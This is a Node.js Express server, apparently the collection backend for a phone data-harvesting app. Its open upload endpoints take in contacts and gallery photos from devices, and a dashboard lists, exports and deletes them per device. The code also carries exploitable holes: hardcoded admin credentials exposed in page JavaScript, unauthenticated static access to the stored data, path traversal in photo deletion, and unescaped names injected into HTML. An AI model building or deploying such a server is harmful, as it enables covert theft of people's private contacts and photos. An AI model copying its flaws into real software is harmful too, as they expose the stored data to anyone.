const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const multer = require('multer');

const app = express();
const PORT = 7860;
const DATA_ROOT = "/data";
if (!fs.existsSync(DATA_ROOT)) {
    fs.mkdirSync(DATA_ROOT, { recursive: true });
}

const ADMIN_USER = "dage";
const ADMIN_PASS = "dage123456";

const jsonParser = express.json({ limit: '4mb' });
const urlEncodedParser = express.urlencoded({ limit: '4mb', extended: true });

app.set('trust proxy', true);
app.use('/view', express.static(DATA_ROOT));

const DATA_FILE = path.join(DATA_ROOT, 'contacts_db.json');

const photoUploadLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 150,
    standardHeaders: true,
    legacyHeaders: false,
    message: JSON.stringify({ status: "too_fast" })
});

const multerParser = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });

const authGuard = (req, res, next) => {
    const authHeader = req.headers.authorization;
    if (!authHeader) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Secure Area"');
        return res.status(401).send('<h1>🔒 拒绝访问</h1>');
    }
    const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
    if (auth[0] === ADMIN_USER && auth[1] === ADMIN_PASS) {
        next();
    } else {
        res.setHeader('WWW-Authenticate', 'Basic realm="Secure Area"');
        return res.status(401).send('<h1>🔒 密码错误</h1>');
    }
};

//通讯录接口单独挂载json解析中间件
app.post('/upload/contacts', jsonParser, (req, res) => {
    try {
        const { contacts, device } = req.body;
        const deviceName = device || "未知设备";
        if (contacts && Array.isArray(contacts)) {
            let existing = [];
            if (fs.existsSync(DATA_FILE)) {
                try {
                    existing = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
                } catch (e) {}
            }
            let addCount = 0;
            contacts.forEach(newC => {
                const isDuplicate = existing.some(extC => extC.phone === newC.phone && extC.device === deviceName);
                if (!isDuplicate) {
                    existing.push({ ...newC, device: deviceName });
                    addCount++;
                }
            });
            fs.writeFileSync(DATA_FILE, JSON.stringify(existing, null, 2), 'utf8');
            console.log(`📊 [${new Date().toLocaleString()}] [${deviceName}] 新增 ${addCount} 条通讯录`);
        }
        res.json({ status: "success" });
    } catch (e) {
        console.error("通讯录上传异常：", e);
        res.status(500).json({ status: "error" });
    }
});

app.post('/upload/photo', photoUploadLimiter, multerParser.single('image'), (req, res) => {
    const startTs = Date.now();
    try {
        const device = req.body.device;
        const md5 = req.body.md5;

        if (!req.file) {
            console.log("❌ 上传请求缺失image文件");
            return res.json({ status: "error", msg: "缺少图片文件数据" });
        }
        if (!device || !md5) {
            console.log("❌ 缺少参数 device=" + device + " md5=" + md5);
            return res.json({ status: "error", msg: "缺少form参数" });
        }

        const imgBuffer = req.file.buffer;
        let deviceName = device || "未知设备";
        deviceName = deviceName.replace(/[\/\\:*?"<>|]/g, '_');
        if (deviceName.length > 80) {
            deviceName = deviceName.substring(0, 80);
        }

        const calcMd5 = crypto.createHash('md5').update(imgBuffer).digest('hex');
        if (md5 !== calcMd5) {
            console.log(`❌ MD5校验失败，传入:${md5} 计算:${calcMd5}`);
            return res.json({ status: "error", msg: "md5校验不通过" });
        }

        const files = fs.readdirSync(DATA_ROOT);
        if (files.some(file => file.indexOf(`_md5_${calcMd5}_`) > -1)) {
            console.log(`跳过重复图片 md5:${calcMd5}`);
            return res.json({ status: "success" });
        }

        const fileName = `photo_${deviceName}_md5_${calcMd5}_${Date.now()}.jpg`;
        fs.writeFileSync(path.join(DATA_ROOT, fileName), imgBuffer);
        console.log(`✅ 图片保存成功:${fileName} 耗时${Date.now() - startTs}ms`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("❌ 图片上传报错：", error);
        res.status(500).json({ status: "error" });
    }
});

app.post('/delete_contact', jsonParser, authGuard, (req, res) => {
    try {
        const { phone, device } = req.body;
        if (fs.existsSync(DATA_FILE)) {
            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            list = list.filter(item => !(item.phone === phone && item.device === device));
            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
            return res.json({ status: "success" });
        }
        res.json({ status: "error" });
    } catch (e) {
        res.status(500).json({ status: "error" });
    }
});

app.post('/delete_photo', jsonParser, authGuard, (req, res) => {
    try {
        const { fileName } = req.body;
        const filePath = path.join(DATA_ROOT, fileName);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            res.json({ status: "success" });
        } else {
            res.json({ status: "error" });
        }
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

app.post('/clear_device_contacts', jsonParser, authGuard, (req, res) => {
    try {
        const { device } = req.body;
        if (fs.existsSync(DATA_FILE)) {
            let list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            list = list.filter(item => item.device !== device);
            fs.writeFileSync(DATA_FILE, JSON.stringify(list, null, 2), 'utf8');
        }
        res.json({ status: "success" });
    } catch (e) {
        res.status(500).json({ status: "error" });
    }
});

// 修复：正则精确匹配文件名，防止带下划线设备名误删其他图片
app.post('/clear_device_photos', jsonParser, authGuard, (req, res) => {
    try {
        const { device } = req.body;
        const files = fs.readdirSync(DATA_ROOT);
        const reg = new RegExp(`^photo_${escapeRegExp(device)}_.*\\.jpg$`);
        files.forEach(file => {
            if (reg.test(file)) {
                fs.unlinkSync(path.join(DATA_ROOT, file));
            }
        });
        res.json({ status: "success" });
    } catch (e) {
        res.status(500).json({ status: "error" });
    }
});

//正则转义工具函数
function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

app.post('/clear_all_contacts', jsonParser, authGuard, (req, res) => {
    try {
        if (fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2), 'utf8');
        res.json({ status: "success" });
    } catch (e) {
        res.status(500).json({ status: "error" });
    }
});

app.post('/clear_all_photos', jsonParser, authGuard, (req, res) => {
    try {
        const files = fs.readdirSync(DATA_ROOT);
        files.forEach(file => {
            if (file.startsWith('photo_') && file.endsWith('.jpg')) fs.unlinkSync(path.join(DATA_ROOT, file));
        });
        res.json({ status: "success" });
    } catch (e) {
        res.status(500).json({ status: "error" });
    }
});

app.get('/export_contacts', authGuard, (req, res) => {
    try {
        const { device } = req.query;
        if (!device) return res.status(400).send('缺少设备参数');
        let list = [];
        if (fs.existsSync(DATA_FILE)) list = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        const filtered = list.filter(item => item.device === device);

        let csvContent = '\uFEFF姓名,电话号码,所属设备\n';
        filtered.forEach(item => {
            csvContent += `"${item.name}","${item.phone}","${item.device}"\n`;
        });
        res.setHeader('Content-Type', 'text/csv; charset=utf-8');
        res.setHeader('Content-Disposition', `attachment; filename=contacts_${encodeURIComponent(device)}.csv`);
        res.send(csvContent);
    } catch (e) {
        res.status(500).send('导出失败');
    }
});

app.get('/', authGuard, (req, res) => {
    try {
        let contactsList = [];
        if (fs.existsSync(DATA_FILE)) {
            try {
                contactsList = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            } catch (e) {}
        }
        const files = fs.readdirSync(DATA_ROOT);
        const imgFiles = files.filter(f => f.startsWith('photo_') && f.endsWith('.jpg'));

        const detectedDevices = new Set();
        contactsList.forEach(c => { if (c.device) detectedDevices.add(c.device); });
        imgFiles.forEach(f => {
            const parts = f.split('_');
            if (parts.length >= 3) detectedDevices.add(parts[1]);
        });
        const devices = Array.from(detectedDevices);

        const devicePhotosMap = {};
        devices.forEach(d => {
            devicePhotosMap[d] = imgFiles.filter(f => f.startsWith(`photo_${d}_`));
        });

        let htmlHead = `
<html>
<head>
<meta charset="utf-8">
<title>📸 智能多端总控台</title>
<style>
body { font-family: sans-serif; background: #f0f2f5; padding: 20px; }
.action-bar { background: #343a40; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 25px; max-width: 1000px; margin-left: auto; margin-right: auto; }
.action-btn { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 8px; font-weight: bold; cursor: pointer; margin: 0 10px; font-size: 13px; }
.filter-bar { max-width: 1000px; margin: 0 auto 20px auto; padding:10px; background:#fff; border-radius:8px; box-shadow:0 2px 5px rgba(0,0,0,0.05); display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
.filter-title { font-weight: bold; color: #555; }
.tab-btn { padding:6px 14px; background:#e4e6eb; border:none; border-radius:20px; cursor:pointer; font-size:14px; }
.tab-btn.active { background:#007bff; color:#fff; }
.export-btn { background:#28a745 !important; color:white !important; }
.device-section { border:2px solid #007bff; padding:20px; border-radius:12px; background:#fff; max-width:1000px; margin:0 auto 40px auto; }
.device-header-box { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; border-bottom:2px solid #007bff; padding-bottom:10px; margin-bottom:15px; }
.device-title { background:#007bff; color:white; padding:6px 15px; border-radius:4px; font-size:16px; font-weight:bold; }
.box { background:#fafafa; padding:15px; border-radius:8px; border:1px solid #ddd; margin-top:15px; }
table { width:100%; border-collapse:collapse; background:#fff; }
th,td { border:1px solid #ddd; padding:8px; text-align:left; font-size:14px; }
th { background:#f1f3f5; }
.gallery { display:flex; flex-wrap:wrap; gap:10px; }
.card { background:#fff; padding:8px; border-radius:6px; border:1px solid #ddd; text-align:center; }
img { max-width:140px; max-height:140px; border-radius:4px; margin-bottom:6px; }
.del-btn { background:#ff4d4f; color:white; border:none; padding:3px 6px; border-radius:4px; cursor:pointer; font-size:11px; }
.fold-btn { background:#6c757d; color:white; border:none; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:12px; margin-left:10px; }
.device-del-btn { background:#fd7e14; color:white; border:none; padding:4px 10px; border-radius:4px; cursor:pointer; font-size:12px; margin:0 5px; }
</style>
<script>
let currentSelectedDevice = 'ALL';
const photosData = ` + JSON.stringify(devicePhotosMap) + `;
const authToken = btoa("${ADMIN_USER}:${ADMIN_PASS}");

function delContact(phone, device, btn) {
    if(!confirm("确定删除吗？")) return;
    fetch('/delete_contact', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic ' + authToken },
        body: JSON.stringify({ phone, device })
    }).then(res=>res.json()).then(data=>{ if(data.status==='success') btn.closest('tr').remove(); });
}
function deleteImage(fileName, button) {
    if(!confirm("确定销毁吗？")) return;
    fetch('/delete_photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic ' + authToken },
        body: JSON.stringify({ fileName })
    }).then(res=>res.json()).then(data=>{ if(data.status==='success') button.closest('.card').remove(); });
}

// 从dom data属性拿设备名称，不再拼接字符串到onclick，修复引号bug
function foldContacts(btn) {
    const deviceId = btn.dataset.dev;
    const box = document.getElementById('contact-box-' + deviceId);
    if(box.style.display === 'none'){ box.style.display='block'; btn.innerText='📕 折叠通讯录'; }
    else { box.style.display='none'; btn.innerText='📖 展开通讯录'; }
}
function clearDeviceContacts(btn){
    const device = btn.dataset.dev;
    if(!confirm("确定清空【"+device+"】全部通讯录吗？")) return;
    fetch('/clear_device_contacts',{
        method:'POST',
        headers:{'Content-Type':'application/json','Authorization':'Basic '+authToken},
        body:JSON.stringify({device})
    }).then(()=>location.reload());
}
function clearDevicePhotos(btn){
    const device = btn.dataset.dev;
    if(!confirm("确定清空【"+device+"】全部相册照片吗？")) return;
    fetch('/clear_device_photos',{
        method:'POST',
        headers:{'Content-Type':'application/json','Authorization':'Basic '+authToken},
        body:JSON.stringify({device})
    }).then(()=>location.reload());
}
function filterDevice(btn){
    const dev = btn.dataset.dev;
    currentSelectedDevice=dev;
    document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
    btn.classList.add('active');
    document.querySelectorAll('.device-section').forEach(sec=>{
        sec.style.display = (dev === 'ALL' || sec.dataset.device === dev) ? 'block' : 'none';
    });
    document.getElementById('global-export-box').style.display = dev === 'ALL' ? 'none' : 'inline-block';
}
function performExport(){
    if(currentSelectedDevice === 'ALL'){ alert("请先选中一台设备"); return; }
    window.location.href = '/export_contacts?device='+encodeURIComponent(currentSelectedDevice);
}
</script>
</head>
<body>
<h1 style="text-align:center; color:#222;">🚀 大哥的云端智能核心控制台</h1>
<div class="action-bar">
<button class="action-btn" onclick="if(confirm('确定清空全部通讯录？'))fetch('/clear_all_contacts',{method:'POST',headers:{'Authorization':'Basic '+authToken}}).then(()=>location.reload())">💣 清空全部通讯录</button>
<button class="action-btn" onclick="if(confirm('确定清空全部图片？'))fetch('/clear_all_photos',{method:'POST',headers:{'Authorization':'Basic '+authToken}}).then(()=>location.reload())">💥 清空全部相册</button>
</div>
<div class="filter-bar">
<span class="filter-title">📱 设备筛选：</span>
<button class="tab-btn active" data-dev="ALL" onclick="filterDevice(this)">全部设备</button>
`;
        let htmlMiddle = "";
        devices.forEach(d=>{
            htmlMiddle += `<button class="tab-btn" data-dev="${d}" onclick="filterDevice(this)">${d}</button>`;
        });
        htmlMiddle += `<span id="global-export-box" style="display:none; margin-left:auto;"><button class="tab-btn export-btn" onclick="performExport()">导出通讯录CSV</button></span></div>`;
        if(devices.length === 0) htmlMiddle += `<h3 style="text-align:center;color:#888;">暂无任何设备数据</h3>`;
        devices.forEach(dev=>{
            const devContacts = contactsList.filter(c=>c.device===dev);
            const devImages = devicePhotosMap[dev] || [];
            htmlMiddle += `<div class="device-section" data-device="${dev}">
                <div class="device-header-box">
                    <div class="device-title">📱 ${dev}</div>
                    <div>
                        <button class="device-del-btn" data-dev="${dev}" onclick="clearDeviceContacts(this)">清空本机通讯录</button>
                        <button class="device-del-btn" data-dev="${dev}" onclick="clearDevicePhotos(this)">清空本机相册</button>
                        <a href="/export_contacts?device=${encodeURIComponent(dev)}" class="tab-btn export-btn" style="text-decoration:none;">导出通讯录</a>
                    </div>
                </div>
                <div class="box">
                    <div style="display:flex;align-items:center;margin-bottom:12px;">
                        <h3 style="margin:0;">通讯录（${devContacts.length}条）</h3>
                        <button class="fold-btn" data-dev="${dev}" onclick="foldContacts(this)">折叠</button>
                    </div>
                    <div id="contact-box-${dev}"><table><tr><th>姓名</th><th>号码</th><th>操作</th></tr>`;
            devContacts.forEach(item=>{
                htmlMiddle += `<tr><td>${item.name}</td><td>${item.phone}</td><td><button class="del-btn" onclick="delContact('${item.phone}','${dev}',this)">删除</button></td></tr>`;
            });
            htmlMiddle += `</table></div></div>
                <div class="box">
                    <h3>相册图片（${devImages.length}张）</h3>
                    <div class="gallery">`;
            devImages.forEach(f=>{
                htmlMiddle += `<div class="card"><img src="/view/${f}"><button class="del-btn" onclick="deleteImage('${f}',this)">删除</button></div>`;
            });
            htmlMiddle += `</div></div></div>`;
        });
        let htmlEnd = `</body></html>`;
        res.send(htmlHead + htmlMiddle + htmlEnd);
    } catch (e) {
        console.error(e);
        res.send('<h2>控制台页面加载出错</h2>');
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log("✅ 完整后台服务启动成功，监听端口 " + PORT);
});
